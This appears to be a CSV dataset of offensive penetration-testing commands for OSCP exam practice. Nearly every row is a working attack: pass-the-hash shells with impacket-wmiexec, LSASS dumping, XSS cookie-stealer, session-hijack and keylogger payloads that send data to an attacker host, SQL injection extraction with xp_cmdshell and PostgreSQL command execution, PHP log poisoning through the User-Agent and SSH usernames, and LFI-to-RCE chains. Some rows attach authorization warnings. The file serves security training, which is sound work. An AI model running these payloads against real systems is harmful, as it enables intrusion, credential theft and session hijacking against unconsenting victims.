"ad-pass-the-hash-impacket-wmiexec","Pass-the-Hash with Impacket WMIExec (Stealthy Shell)","post-exploit","impacket-wmiexec -hashes :<NTLM_HASH> <DOMAIN>/<USERNAME>@<TARGET>","Execute commands on remote system via WMI using Pass-the-Hash. STEALTHIER than psexec - no service creation, no file writes to ADMIN$. Uses DCOM for semi-interactive shell. RECOMMENDED for domain controllers and high-security targets.","active-directory","WMIExec is the RECOMMENDED method for stealthy lateral movement in OSCP. WHEN TO USE: (1) Targeting domain controllers (less forensic footprint), (2) ADMIN$ share is disabled/blocked, (3) AV detects psexec service creation, (4) Need to avoid Event ID 7045 (service creation) alerts.

STEALTH COMPARISON:
PsExec: Writes binary (RemComSvc.exe) to ADMIN$, creates service (Event 7045), deletes after. HIGH IOC.
WMIExec: No file write, no service, uses existing WMI infrastructure. MEDIUM IOC (Event 4648, 4624 Type 3).
SMBExec: Writes batch file to C$ or other writable share, executes via service. MEDIUM IOC.
AtExec: Uses Task Scheduler (schtasks.exe), creates scheduled task. LOW IOC (uncommon technique).

OSCP WORKFLOW:
1. Obtain NTLM hash (DCSync or dump)
2. Verify admin access: crackmapexec smb <TARGET> -u <USER> -H <HASH> (look for 'Pwn3d!')
3. Spawn shell: impacket-wmiexec -hashes :<HASH> <DOMAIN>/<USER>@<TARGET>
4. Execute commands: whoami, net user, reg query, etc.
5. Dump SAM/LSASS for additional credentials
6. Download files via SMB: copy <FILE> \\<ATTACKER_IP>\share\
7. Lateral movement to next system

COMMON MISTAKES:
- Expecting fully interactive shell (it's SEMI-interactive, slower response than psexec)
- Using wmiexec when psexec would work (wmiexec is slower, use when stealth needed)
- Not opening required firewall ports (135 + dynamic high ports 49152-65535)
- Forgetting colon before NTLM hash in -hashes flag

PERFORMANCE:
- Slower than psexec (each command creates new WMI process)
- Output may be delayed (1-3 seconds per command)
- Large file operations are SLOW (use SMB copy instead)
- Interactive programs (like mimikatz) don't work well (use one-line commands)

BEST PRACTICES:
- Use FQDN on domain controllers for Kerberos authentication (stealthier)
- One-line commands work best: type C:\Users\Public\passwords.txt
- For file transfers, use SMB: impacket-smbserver share /tmp -smb2support
- Combine with procdump for LSASS: procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp

TIME ESTIMATE: 5-10 seconds connection, 1-3 seconds per command execution","high"
"xss-test-svg-onload","XSS Test - SVG onload Event","web","<svg onload=alert(1)>","XSS test payload using SVG onload event handler, effective when script tags are filtered but HTML tags allowed","","Use when:
Testing for XSS in contexts where <script> tags are filtered but HTML tags are allowed.

Works in:
All modern browsers.

Delivery:
Inject in URL parameters (?param=<svg onload=alert(1)>), form fields, or anywhere user input is reflected.

Expected result:
Browser alert() dialog.

AUTHORIZATION REQUIRED:
Only test on systems you own or have written permission to test.

Responsible disclosure:
Report findings to security team before public disclosure.","medium"
"xss-test-body-onload","XSS Test - Body onload Event","web","<body onload=alert(1)>","XSS test payload using body onload event handler, effective when full HTML injection is possible","","Use when:
Testing for XSS where full HTML structure can be injected (rare in modern apps).

Works in:
All browsers, but less reliable than event-based payloads due to existing <body> tags.

Delivery:
Primarily in contexts where entire HTML document can be controlled (e.g., stored XSS in page templates).

AUTHORIZATION REQUIRED:
Only test on authorized targets.

Note:
This payload is less practical than event handlers like SVG/IMG but useful for understanding HTML injection scope.","medium"
"xss-test-img-onerror","XSS Test - IMG onerror Event","web","<img src=x onerror=alert(1)>","XSS test payload using IMG tag with onerror event, one of the most reliable XSS vectors","","Use when:
Most common XSS test payload, works in contexts where IMG tags are allowed.

Works in:
All browsers, highly reliable because invalid src triggers onerror immediately.

Delivery:
URL parameters (?search=<img src=x onerror=alert(1)>), form inputs, comment fields.

Expected result:
Immediate alert() when page renders.

ADVANTAGES:
Self-contained (no external resources), fires on load, bypasses many filters.

AUTHORIZATION:
Test only on systems you own or have written permission to test.","high"
"xss-test-script-basic","XSS Test - Basic Script Tag","web","<script>alert(1)</script>","Basic XSS test payload using script tag, most direct but heavily filtered method","","Use when:
Testing basic XSS protection, baseline test before trying advanced bypasses.

Works in:
Unfiltered applications (rare in production).

Delivery:
Any input field, URL parameter.

Expected result:
Immediate alert() on page load.

REALITY CHECK:
Most modern applications filter <script> tags, so this payload often fails.

Use as initial test, then try event-based alternatives if blocked.

AUTHORIZATION:
Only test on authorized targets.","medium"
"xss-test-script-context-break","XSS Test - Script Context Breaking","web","""><script>alert(1)</script>","XSS payload that breaks out of HTML attribute context before injecting script","","Use when:
Input is reflected inside HTML attribute (common in search forms, user profiles).

Context example:
<input value=""[YOUR INPUT HERE]"">.

The "" closes the attribute, > closes the tag, then <script> executes.

Works in:
All browsers if attribute escaping is missing.

Delivery:
Test by viewing page source first to identify injection context.

Expected result:
Browser alert() after breaking out of attribute.

TECHNIQUE:
This is a 'context-breaking' attack - understanding injection context is critical for XSS exploitation.

AUTHORIZATION:
Test only on authorized systems.","high"
"xss-test-event-context-break","XSS Test - Event Handler Context Break","web",""" onerror=alert(1) x=""","XSS payload that stays within tag context but adds malicious event handler attribute","","Use when:
Input reflected in HTML tag attribute where breaking out would be filtered.

Context example:
<img src=""[YOUR INPUT]"">.

Payload becomes:
<img src="""" onerror=alert(1) x="""">.

The first "" closes src value, onerror= adds handler, x="""" absorbs trailing quote.

Works in:
Contexts where you can inject attributes but not break tags.

Delivery:
View source to identify tag context first.

Expected result:
Alert fires when event triggers (immediately for onerror with invalid src).

ADVANCED:
This technique shows understanding of HTML parsing - staying within tag context while injecting malicious attributes.

AUTHORIZATION:
Test only on authorized systems.","high"
"xss-filter-bypass-case","XSS Filter Bypass - Case Variation","web","<ScRiPt>alert(1)</ScRiPt>","XSS filter bypass using case variation to evade blacklist filters","","Use when:
Basic XSS test (xss-test-script-basic) failed due to blacklist filter.

How it works:
HTML is case-insensitive (<ScRiPt> = <script>), but naive filters may only block lowercase.

Works in:
Applications with poorly-implemented blacklist filters.

Delivery:
Same as basic XSS test.

Expected result:
Alert fires if filter only checks lowercase 'script'.

LEARNING POINT:
This demonstrates why blacklist filtering is ineffective - there are infinite variations to bypass.

Modern apps should use whitelist/sanitization instead.

AUTHORIZATION:
Test only on authorized systems.","medium"
"xss-filter-bypass-encoding","XSS Filter Bypass - HTML Entity Encoding","web","<img src=x onerror=""&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;"">","XSS filter bypass using HTML entity encoding in event handler to evade signature-based filters","","Use when:
Basic event handler XSS blocked by keyword filter (e.g., 'alert' blacklisted).

How it works:
HTML entities (&#97; = 'a') encode the JavaScript in onerror attribute.

Browser decodes entities before executing JavaScript.

Encoded:
alert(1) = &#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;.

Works in:
HTML attribute contexts where entities are decoded.

Delivery:
Form inputs, URL parameters.

Expected result:
Browser decodes and executes alert(1).

ADVANCED:
Can also use hex (&#x61;) or named entities (&lt;) depending on context.

AUTHORIZATION:
Test only on authorized systems.

LEARNING:
Demonstrates importance of canonicalization in input validation.","high"
"xss-cookie-stealer","XSS Cookie Stealer Payload","web","<script>document.location='http://<ATTACKER_IP>:<PORT>/steal.php?c='+document.cookie</script>","XSS exploitation payload that exfiltrates victim's cookies to attacker-controlled server","","PREREQUISITES:
Start listener on attacker machine:
python3 -m http.server <PORT>.

Use when:
Basic XSS confirmed, targeting session hijacking.

How it works:
document.cookie retrieves all accessible cookies, document.location redirects victim to attacker URL with cookies in query string.

Works in:
Any browser, any XSS context.

Delivery:
Use proven XSS vector (IMG onerror, SVG onload) but replace alert(1) with this payload.

Expected result:
Attacker web server receives HTTP request with victim's cookies.

CRITICAL:
HttpOnly flag (set on sensitive cookies) prevents document.cookie access - check Set-Cookie headers.

AUTHORIZATION:
Only use on authorized penetration tests.

LEGAL:
Unauthorized cookie theft is illegal.

ALTERNATIVES:
Use fetch() API for stealthier exfiltration, or target localStorage for modern apps.","high"
"xss-session-hijack-fetch","XSS Session Hijack via Fetch API","web","<script>fetch('http://<ATTACKER_IP>:<PORT>/steal?c='+document.cookie)</script>","Modern XSS exploitation using Fetch API to exfiltrate session data without page redirect","","PREREQUISITES:
Start listener:
python3 -m http.server <PORT> or nc -lvnp <PORT>.

Use when:
Basic XSS confirmed, prefer stealth over xss-cookie-stealer (which redirects page).

How it works:
fetch() API sends async HTTP request to attacker server without redirecting victim's page.

Modern alternative to XMLHttpRequest.

Works in:
Modern browsers (IE11+, all current browsers).

Delivery:
Inject via proven XSS vector.

Expected result:
Attacker receives HTTP GET request with cookie data in query string, victim page remains unchanged.

ADVANTAGES over document.location:
Stealthy (no redirect), can send multiple requests, victim stays on page.

LIMITATIONS:
HttpOnly cookies still protected.

CSP connect-src directive may block.

AUTHORIZATION:
Only use on authorized tests.

LEGAL:
Session hijacking is illegal without authorization.","high"
"xss-keylogger","XSS Keylogger Payload","web","<script>document.onkeypress=function(e){fetch('http://<ATTACKER_IP>:<PORT>/log?k='+e.key)}</script>","XSS exploitation payload that captures all keystrokes and sends to attacker server in real-time","","PREREQUISITES:
Start listener:
python3 -m http.server <PORT>.

Use when:
Stored XSS confirmed on high-value target (admin panels, login pages).

How it works:
onkeypress event fires on every key, fetch() sends each keystroke to attacker.

Real-time exfiltration.

Works in:
All modern browsers.

Delivery:
Requires stored/persistent XSS for effectiveness (reflected XSS won't capture much).

Expected result:
Attacker receives stream of HTTP requests with each key pressed.

STEALTH ISSUES:
Generates high network traffic (one request per keystroke), may be noticeable.

IMPROVEMENT:
Buffer keystrokes in array, send batch every 5 seconds to reduce traffic.

AUTHORIZATION:
Only use on authorized penetration tests.

LEGAL:
Keylogging is serious crime without authorization.

ETHICS:
Even in authorized tests, discuss scope with client before deploying keyloggers.","high"
"sqli-detection-error","SQL Injection Detection (Error-Based)","web","curl -s '<URL>' | grep -iE 'error|warning|mysql|syntax|postgresql|mssql|oracle|sqlite'","Detect SQL injection vulnerabilities by triggering database errors with single quote payload","sql-injection","First step in manual SQLi exploitation.

ALWAYS test multiple payloads (single quote, double quote, parenthesis).

Error messages reveal:
(1) Database type (MySQL/PostgreSQL/MSSQL), (2) Query structure, (3) Column names/table names.

Document ALL findings in investigation_checklist.md.

For OSCP:
Master manual techniques BEFORE using sqlmap.

Time estimate:
5-10 minutes for initial detection.","high"
"sqli-column-enum-orderby","SQL Injection Column Enumeration (ORDER BY)","web","for i in {1..<MAX_COLS>}; do echo ""Testing column $i""; curl -s '<URL> ORDER BY $i-- -' | grep -i error && echo ""Failed at column $i"" && break; done","Enumerate number of columns in SQL query using ORDER BY technique (required before UNION SELECT)","sql-injection","CRITICAL step for UNION-based SQLi.

Column count MUST match between original query and UNION SELECT.

Manual alternative:
Test ORDER BY 1, ORDER BY 2, ORDER BY 3...

until error.

When error occurs at column N, original query has N-1 columns.

Example:
Error at ORDER BY 5 = query has 4 columns.

Time estimate:
2-5 minutes.

Document column count in investigation_checklist.md for UNION exploitation phase.","high"
"sqli-union-select-basic","SQL Injection UNION SELECT (Basic Extraction)","web","curl -s '<URL> UNION SELECT <NULL_COLUMNS>-- -'","Test UNION SELECT injection and identify which columns are displayed on page (required for data extraction)","sql-injection","FOUNDATION of UNION-based SQLi exploitation.

Once you identify displayed columns (e.g., columns 2 and 4 visible), ALL future queries use those positions for data extraction.

Example workflow:
(1) Enumerate columns:
4 total, (2) Test visibility:
'test1',NULL,NULL,'test2', (3) Identify:
columns 1 and 4 are displayed, (4) Extract data:
database(),user(),NULL,version().

Time estimate:
5-10 minutes.

ALWAYS test with invalid id first (id=-1) to avoid mixing original and injected results.

Document displayed column positions in investigation_checklist.md.","high"
"sqli-union-mysql-info","SQL Injection UNION SELECT (MySQL Information Extraction)","web","curl -s '<URL> UNION SELECT <PAYLOAD>,<EMPTY_COLS>-- -' | grep -i '<SEARCH_TERM>'","Extract MySQL database information using UNION SELECT injection (database names, table names, column names, data)","sql-injection","MySQL-SPECIFIC extraction queries (order matters):
(1) List databases:
database() or CONCAT(schema_name) FROM information_schema.schemata.

(2) List tables:
CONCAT(table_schema,':',table_name) FROM information_schema.tables WHERE table_schema NOT IN ('mysql','information_schema').

(3) List columns:
CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema='target_db'.

(4) Extract data:
CONCAT(username,':',password) FROM users.

Use GROUP_CONCAT() to get all rows:
GROUP_CONCAT(username,':',password SEPARATOR '|') FROM users.

Time estimate:
10-20 minutes for full database enumeration.

OSCP TIP:
Always check for 'users', 'admin', 'credentials', 'accounts' tables.

Document findings in investigation_checklist.md.","high"
"sqli-union-postgresql-info","SQL Injection UNION SELECT (PostgreSQL Information Extraction)","web","curl -s '<URL> UNION SELECT <PAYLOAD>,<EMPTY_COLS>-- -' | grep -i '<SEARCH_TERM>'","Extract PostgreSQL database information using UNION SELECT injection (databases, tables, columns, data, file read)","sql-injection","PostgreSQL-SPECIFIC extraction queries (syntax differs from MySQL):
(1) Version/User:
version() or current_user().

(2) Current database:
current_database().

(3) List tables:
table_name FROM information_schema.tables WHERE table_schema='public'.

(4) List columns:
table_name||':'||column_name FROM information_schema.columns WHERE table_schema='public'.

(5) Extract data:
username||':'||password FROM users.

(6) File read:
pg_read_file('/etc/passwd',0,1000) requires superuser.

(7) Command execution:
COPY (SELECT '') TO PROGRAM 'id' (PostgreSQL 9.3+ with superuser).

OSCP TIP:
PostgreSQL often has 'postgres' superuser with weak password.

Test default credentials.

Time estimate:
10-20 minutes.

Document in investigation_checklist.md.","high"
"sqli-union-mssql-info","SQL Injection UNION SELECT (MSSQL Information Extraction)","web","curl -s '<URL> UNION SELECT <PAYLOAD>,<EMPTY_COLS>-- -' | grep -i '<SEARCH_TERM>'","Extract Microsoft SQL Server information using UNION SELECT injection (databases, tables, columns, xp_cmdshell RCE)","sql-injection","MSSQL-SPECIFIC extraction queries and RCE techniques:
(1) Version:
@@version or SERVERPROPERTY('ProductVersion').

(2) Current database:
DB_NAME().

(3) List databases:
name FROM sys.databases (exclude system:
WHERE name NOT IN ('master','tempdb','model','msdb')).

(4) List tables:
name+':'+type_desc FROM sys.tables.

(5) List columns:
c.name+':'+t.name FROM sys.columns c JOIN sys.tables t ON c.object_id=t.object_id.

(6) Extract data:
username+':'+CAST(password AS VARCHAR) FROM users.

(7) RCE via xp_cmdshell:
EXEC xp_cmdshell 'whoami' (requires sysadmin role).

(8) Enable xp_cmdshell:
UNION SELECT NULL; EXEC sp_configure 'show advanced',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- (stacked queries needed).

OSCP TIP:
MSSQL often runs as 'NT AUTHORITY\SYSTEM' - xp_cmdshell = instant SYSTEM shell.

Test for stacked queries first.

Time estimate:
15-25 minutes.

Document xp_cmdshell status in investigation_checklist.md.","high"
"sqlmap-post-exploitation","SQLMap Automated Exploitation","web","sqlmap -u '<URL>' --batch --dump <OPTIONS>","Automated SQL injection exploitation using sqlmap (after manual verification - OSCP requires manual attempt first)","sql-injection","OSCP WORKFLOW REQUIREMENT:
(1) ALWAYS attempt manual SQLi first (sqli-detection-error → sqli-column-enum-orderby → sqli-union-select-basic).

(2) Document manual findings in investigation_checklist.md.

(3) THEN use sqlmap for faster enumeration.

Common sqlmap workflow:
Step 1:
Detect injection:
sqlmap -u 'URL' --batch.

Step 2:
Enumerate databases:
sqlmap -u 'URL' --batch --dbs.

Step 3:
Enumerate tables:
sqlmap -u 'URL' --batch -D webapp_db --tables.

Step 4:
Dump specific table:
sqlmap -u 'URL' --batch -D webapp_db -T users --dump.

Step 5:
Attempt OS shell:
sqlmap -u 'URL' --batch --os-shell (MSSQL xp_cmdshell, PostgreSQL COPY).

Output location:
~/.local/share/sqlmap/output/<TARGET>/ (check log.txt for full output).

Time estimate:
5-30 minutes depending on injection type and database size.

WAF bypass:
Use --tamper=space2comment for comments, --tamper=between for AND/OR replacement.

POST requests:
sqlmap -u 'URL' --data='id=1&submit=Submit' (specify POST data).

Cookies:
--cookie='PHPSESSID=abc123'.

Custom headers:
--headers='X-Forwarded-For:
127.0.0.1'.

REMEMBER:
Manual technique demonstrates understanding for OSCP report.","high"
"wpscan-enumerate-all","WPScan Comprehensive Enumeration","web","wpscan --url <URL> --enumerate u,ap,at,vp,vt,cb,dbe --api-token <WPSCAN_API_TOKEN> --disable-tls-checks","Enumerate WordPress users, plugins, themes, and vulnerabilities with comprehensive detection","wordpress","WordPress is extremely common in OSCP labs (appears in 30%+ of machines).

Always enumerate users first (u), then plugins (ap), then themes (at).

API token enhances vulnerability detection but not required for basic enumeration.

Time estimate:
5-15 minutes depending on plugin/theme count.

Document all findings in enumeration.md.

Free API token:
https://wpscan.com/register (25 API calls/day sufficient for exam).

Without API token, you still get plugin/theme/user enumeration but miss known vulnerabilities.","high"
"wpscan-aggressive-detection","WPScan Aggressive Plugin/Theme Detection","web","wpscan --url <URL> --plugins-detection aggressive --themes-detection aggressive --enumerate ap,at --api-token <WPSCAN_API_TOKEN>","Aggressive WordPress plugin and theme enumeration (more thorough but noisier than passive detection)","wordpress","Aggressive detection is more thorough but generates more logs (easier to detect).

Use when passive enumeration (wpscan-enumerate-all) fails to find plugins/themes.

Time estimate:
10-20 minutes.

Passive mode:
checks readme.txt and meta tags only (stealthy).

Aggressive mode:
attempts directory listing, checks multiple version files (noisy but complete).

For OSCP, start passive then go aggressive if needed.","high"
"wpscan-password-attack","WPScan WordPress Password Attack","web","wpscan --url <URL> --usernames <USERS> --passwords <WORDLIST> --max-threads <THREADS>","WordPress user password brute force attack using discovered usernames and wordlist","wordpress","WordPress password attacks are common in OSCP (credentials often lead to RCE via plugin/theme upload).

Time estimate:
15-60 minutes depending on wordlist size.

Always enumerate users first (wpscan-enumerate-all).

Common usernames:
admin, administrator, editor, author, john.

Start with small wordlist (1000-5000 passwords), expand if needed.

Rate limiting:
most WordPress sites allow 5-10 requests/second before blocking.

Use --throttle to avoid lockout.

Success = admin access = RCE via plugin/theme modification.","high"
"wordpress-xmlrpc-enum","WordPress XML-RPC Enumeration","web","curl -X POST -d '<methodCall><methodName>system.listMethods</methodName></methodCall>' <URL>/xmlrpc.php","Enumerate WordPress XML-RPC methods (potential for brute force, pingback attacks, and SSRF)","wordpress","XML-RPC is a WordPress API endpoint (often enabled by default in older versions).

Security implications:
1) Brute force:
wp.getUsersBlogs method allows credential testing without lockout, 2) Pingback DDoS:
pingback.ping can be abused for DDoS amplification, 3) system.multicall:
send hundreds of login attempts in ONE request (bypasses rate limiting).

Time estimate:
2-5 minutes.

Pingback exploitation:
attacker can make WordPress server ping arbitrary URLs (SSRF).

For OSCP:
check if XML-RPC is enabled, enumerate methods, test for brute force capability.

Modern WordPress disables by default but legacy sites are vulnerable.","high"
"wordpress-manual-version","Manual WordPress Version Detection","web","curl -s <URL> | grep 'content=""WordPress'","Manual WordPress version detection via meta generator tag (fallback when wpscan is blocked or unavailable)","wordpress","Manual version detection is CRITICAL when wpscan is blocked/unavailable (common in OSCP due to WAF/IPS).

Time estimate:
1-2 minutes.

Version detection methods (in order):
1) Meta generator tag (this command), 2) readme.html, 3) RSS feed generator, 4) JavaScript/CSS file paths, 5) Theme/plugin versions (indirect).

Why manual matters:
wpscan may be blocked by WAF but curl often bypasses.

WordPress versions have known exploits:
4.x = RCE vulns, 5.0-5.2 = image upload RCE, 5.x = XSS.

Always check version BEFORE exploitation attempts.

Document in enumeration.md.","high"
"curl-ua-poison-apache","Apache User-Agent Log Poisoning","web","curl -A '<?php system($_GET[""c""]); ?>' http://<TARGET>:<PORT>/","Inject PHP code into Apache access.log via User-Agent header","","Manual alternative:
Use netcat to send raw HTTP request:
echo -e 'GET / HTTP/1.1\r\nHost:
<TARGET>\r\nUser-Agent:
<?php system($_GET[""c""]); ?>\r\n\r\n' | nc <TARGET> <PORT>.

Timing:
1-2 minutes for poisoning.

Add 2-3 minutes for LFI trigger and shell upgrade.

Total:
3-5 minutes.

Success rate:
High (70-80% when LFI confirmed and logs accessible).","Core LFI-to-RCE technique. Apache logs User-Agent without sanitization by default. Combined with LFI, achieves remote code execution. Common in OSCP (appears in ~30% of web boxes). Fast execution (2-3 minutes total)."
"curl-ua-poison-nginx","Nginx User-Agent Log Poisoning","web","curl -A '<?php system($_GET[""c""]); ?>' http://<TARGET>:<PORT>/","Inject PHP code into Nginx access.log via User-Agent header (Nginx variant)","","Manual alternative:
Raw HTTP via netcat (same as Apache variant).

Or use telnet:
telnet <TARGET> <PORT>, then manually type:
GET / HTTP/1.1<ENTER>Host:
<TARGET><ENTER>User-Agent:
<?php system($_GET[""c""]); ?><ENTER><ENTER> Success rate:
Medium-High (60-70%).

Lower than Apache because:
(1) Nginx admins more likely to customize log format, (2) SELinux/AppArmor more common on Nginx setups, (3) User-Agent logging sometimes disabled for performance.

Higher success on default Nginx installs.

Timing:
2-3 minutes (slightly longer than Apache due to path/user enumeration).

Add 1 minute for initial Nginx vs Apache detection.","Nginx becoming more common in OSCP (20-25% of web boxes). Technique identical to Apache, but different log paths and permissions. Nginx worker runs as 'nginx' or 'www-data' depending on distro. Understanding platform differences critical for exam success."
"lfi-access-log-apache","LFI Read Apache Access Log","web","curl 'http://<TARGET>:<PORT>/<LFI_PARAM>?<PARAM>=../../../../var/log/apache2/access.log'","Use LFI vulnerability to read Apache access.log (for verification or RCE trigger)","","Manual alternative:
Use browser:
Navigate to http://<TARGET>/<LFI_PARAM>?<PARAM>=../../../../var/log/apache2/access.log directly.

Advantage:
See formatted output with syntax highlighting extensions.

Disadvantage:
Browser modifies User-Agent (harder to control payload injection).

For exam:
curl preferred (scriptable, exact control).

Success rate:
Medium (50-60%).

Many modern setups restrict log permissions (640 root:adm).

Default Apache on older Ubuntu (<=16.04) often world-readable (644).

OSCP boxes tend toward permissive configs for challenge purposes.

Timing:
30 seconds to 1 minute (quick verification step before poisoning).","Two-phase usage: (1) Verify log is readable before poisoning (saves time), (2) Trigger RCE after poisoning. Exam efficiency critical - test access before wasting time on poisoning. Common mistake: Poisoning log that LFI can't access."
"lfi-access-log-nginx","LFI Read Nginx Access Log","web","curl 'http://<TARGET>:<PORT>/<LFI_PARAM>?<PARAM>=../../../../var/log/nginx/access.log'","Use LFI vulnerability to read Nginx access.log (for verification or RCE trigger)","","Manual alternative:
Browser-based testing (same as Apache).

For multi-vhost enumeration:
Use gobuster/wfuzz to fuzz vhost names, then try /var/log/nginx/<VHOST>_access.log.

Example:
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://<TARGET>/index.php?file=../../../../var/log/nginx/FUZZ_access.log' --hh 0 Success rate:
Medium (50-60%, similar to Apache).

Nginx advantage:
error.log often 644 permissions (more permissive than Apache error.log which is typically 640).

Timing:
1 minute (includes Nginx detection + log path enumeration).","Nginx-specific variant of Apache log reading. Path differences critical: /var/log/nginx/ vs /var/log/apache2/. Multi-vhost Nginx setups often use named logs (/var/log/nginx/<DOMAIN>_access.log) - requires enumeration. OSCP scenario: Default configs more common, but knowing variants saves time."
"ssh-authlog-poison","SSH Auth Log Poisoning via Failed Login","web","ssh '<?php system($_GET[""c""]); ?>'@<TARGET>","Poison /var/log/auth.log by injecting PHP code into SSH username field (failed login technique)","","Manual alternative:
If SSH client rejects PHP payload (some clients validate username format):
Use raw TCP socket.

Python one-liner:
python3 -c ""import socket; s=socket.socket(); s.connect(('<TARGET>',22)); s.recv(1024); s.send(b'SSH-2.0-OpenSSH_8.0\r\n'); s.send(b'<?php system(\$_GET[\""c\""]); ?>\r\n')"" (less reliable but bypasses client validation).

Success rate:
High (70-80% when SSH exposed and auth.log readable).

Advantages over web log poisoning:
(1) auth.log often group-readable (syslog group), (2) less likely to have SELinux restrictions, (3) works even if no web server running.

Disadvantages:
(1) Requires SSH port open, (2) generates failed login alerts (stealth concern in real engagements, not OSCP).

Timing:
1-2 minutes for poisoning.

30 seconds for SSH detection (nmap).

Total:
2-3 minutes.","Critical alternative when web logs not accessible. SSH logs to /var/log/auth.log, which is often more permissive (readable by syslog group, www-data sometimes member). OSCP frequency: Medium (15-20% of LFI challenges require this when Apache/Nginx logs fail). Failed login intentional - we want payload logged, not actual authentication."
"lfi-auth-log","LFI Read SSH Auth Log","web","curl 'http://<TARGET>:<PORT>/<LFI_PARAM>?<PARAM>=../../../../var/log/auth.log'","Use LFI to read /var/log/auth.log (SSH authentication log) for verification or RCE trigger","","Manual alternative:
Browser-based or use wget:
wget -q -O - 'http://<TARGET>/<LFI_PARAM>?<PARAM>=../../../../var/log/auth.log' (wget advantage:
saves to file for offline analysis).

Success rate:
Medium-High (60-70%).

auth.log often more permissive than web logs.

Default permissions:
640 root:adm, but www-data sometimes in adm group (Ubuntu Server default) or syslog group.

Timing:
30 seconds (quick verification).","Pre-check before SSH log poisoning. Verifies: (1) auth.log exists, (2) readable by www-data, (3) SSH logging enabled. Common in OSCP when web logs fail. Auth.log contains: SSH logins, sudo attempts, cron jobs, user switches - useful for enumeration even without poisoning."
"lfi-proc-environ","LFI Read /proc/self/environ","web","curl -A '<?php system($_GET[""c""]); ?>' 'http://<TARGET>:<PORT>/<LFI_PARAM>?<PARAM>=../../../../proc/self/environ'","Advanced log poisoning via /proc/self/environ - poison environment variables and trigger RCE","","Manual alternative:
Two-step approach using telnet:
(1) telnet <TARGET> <PORT>, (2) Manually type:
GET /<LFI_PARAM>?<PARAM>=../../../../proc/self/environ HTTP/1.1<ENTER>Host:
<TARGET><ENTER>User-Agent:
<?php system($_GET[""c""]); ?><ENTER><ENTER>.

Same result, more control over exact request format.

Success rate:
Medium (50-60%).

Works when:
(1) /proc filesystem mounted, (2) PHP not in strict safe_mode.

Fails when:
(1) Docker/container with --security-opt no-new-privileges, (2) /proc mounted with hidepid=2 option (paranoid security), (3) PHP CGI mode (different process context).

Success rate lower than log poisoning but critical fallback.

Timing:
2-3 minutes (includes understanding /proc output format).

Faster if familiar with technique.","Advanced technique when all log files fail. /proc/self/environ contains environment variables of current PHP process, including HTTP headers. By poisoning User-Agent (becomes HTTP_USER_AGENT env var), we inject code. Less common in OSCP (10-15%) but high-value when it works. Demonstrates deeper Linux knowledge."
"lfi-rce-trigger","LFI Trigger RCE After Log Poisoning","web","curl 'http://<TARGET>:<PORT>/<LFI_PARAM>?<PARAM>=../../../../var/log/apache2/access.log&c=<COMMAND>'","Trigger remote code execution via poisoned log file (second phase after successful poisoning)","","Manual alternative:
Browser-based for simple commands:
Navigate to http://<TARGET>/<LFI_PARAM>?<PARAM>=../../../../var/log/apache2/access.log&c=whoami.

For complex commands (reverse shells with special chars):
Use Burp Suite Repeater to avoid URL encoding issues.

Best practice:
URL-encode <COMMAND> for reliability (bash -c becomes bash%20-c).

Success rate:
Very High (90-95% after successful poisoning).

Main failure point is earlier (poisoning/log access), not execution.

If you reach this step, RCE almost guaranteed unless PHP restrictions present.

Timing:
30 seconds per command test.

2-3 minutes for reverse shell establishment.","Second phase of log poisoning attack. First phase: inject payload via curl-ua-poison-apache. Second phase: trigger execution via this command. Understanding two-phase nature critical for OSCP - many students poison successfully but fail to trigger. This command demonstrates the full attack chain."
"gobuster-dir","Directory Bruteforce","web","gobuster dir -u <URL> -w <WORDLIST> -x php,asp,aspx,html,txt -t <THREADS>","Discover hidden directories and files","","Adjust extensions based on technology stack","high"
"nikto-scan","Nikto Web Scanner","web","nikto -h <URL> -output <OUTPUT>","Web vulnerability scanner","","Can be slow but thorough","medium"
"sqlmap-basic","SQLMap Basic Scan","web","sqlmap -u '<URL>?<PARAM>=<VALUE>' --batch --banner","Automated SQL injection testing","","Save Burp request to file for complex requests","high"
"sqli-manual-test","Manual SQLi Test","web","' OR 1=1--","Basic SQL injection payload","","Try with both single and double quotes","high"
"wfuzz-params","Parameter Fuzzing","web","wfuzz -c -z file,<WORDLIST> --hc 404 '<URL>?FUZZ=test'","Discover hidden parameters","","Filter by response size or status code","medium"
"xss-test","XSS Basic Test","web","<script>alert(1)</script>","Basic XSS payload","","Check if input is reflected in response

Alternative Techniques:
- ""><script>alert(1)</script>","medium"
"lfi-test","LFI Basic Test","web","../../../../../../etc/passwd","Local file inclusion test","","Try with null byte (%00) termination

Alternative Techniques:
- ....//....//etc/passwd
- ..\..\..\..\windows\system32\drivers\etc\hosts
- file:///etc/passwd","high"
"curl-post","cURL POST Request","web","curl -X POST -d '<PARAM>=<VALUE>' <URL>","Send POST request with data","","Use -H for custom headers","medium"
"whatweb-enum","Technology Stack Identification","web","whatweb -v <URL>","Identify web technologies","","Essential for finding version-specific exploits","high"
"web-manual-enumeration","Manual Web Application Enumeration","web","Browse application, view source, check robots.txt, examine forms, test inputs, enumerate pages","Manually enumerate web application to identify technologies, attack surface, and potential vulnerabilities before automated tools","enumeration","CRITICAL OSCP METHODOLOGY: Manual enumeration BEFORE automated tools.

Manual web enumeration checklist:
(1) Browse application
    - Visit all pages
    - Click all links
    - Map functionality (login, search, upload, contact, admin)
    - Note unusual features

(2) View page source (Ctrl+U)
    - HTML comments (<!-- TODO: Remove admin backdoor -->)
    - JavaScript files (api endpoints, validation logic)
    - Hidden form fields
    - Hardcoded credentials
    - Version numbers

(3) Check standard files
    - /robots.txt (disallowed paths are interesting)
    - /sitemap.xml (all pages listed)
    - /.git/ (exposed Git repository)
    - /backup/, /backup.zip
    - /README.md, /CHANGELOG.md

(4) Technology identification
    - Framework: Laravel (.blade.php), Django (csrftoken), WordPress (wp-content)
    - Language: PHP (.php extension), ASP (.aspx), JSP (.jsp)
    - Server: Apache (Server header), Nginx, IIS
    - CMS: WordPress, Joomla, Drupal (view source for indicators)

(5) Test all input fields
    - Login forms: SQL injection ('admin'--), default creds
    - Search: XSS (<script>alert(1)</script>), SQLi
    - Upload: File upload bypass, webshell upload
    - Contact forms: Command injection, email injection
    - URL parameters: SQLi, LFI, XSS

(6) Examine HTTP headers
    curl -I http://target
    - Server version (Apache/2.4.41)
